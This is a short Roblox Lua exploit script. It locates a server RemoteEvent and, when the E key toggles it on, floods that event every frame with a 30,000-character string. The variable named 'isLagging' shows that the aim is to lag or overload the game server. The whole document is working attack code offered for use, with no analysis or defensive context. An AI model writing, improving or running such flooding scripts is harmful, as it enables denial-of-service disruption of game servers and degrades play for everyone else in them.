local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
 
local isLagging = false
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28" 
 
 
local num = string.rep("z", 30000) 
 
 
local target = nil
for _, v in pairs(game:GetDescendants()) do
 
    if v:IsA("RemoteEvent") and v.Name ~= "friendmain" and v.Name ~= "ping" then
        target = v
        break
    end
end
 
 
UserInputService.InputBegan:Connect(function(input, proc)
    if not proc and input.KeyCode == Enum.KeyCode.E then
        isLagging = not isLagging
print("test")
    end
end)
 
 
RunService.Heartbeat:Connect(function()
    if isLagging and target then
         for i = 1, 1 do
            target:FireServer(uuid, num)
        end
    end
end)
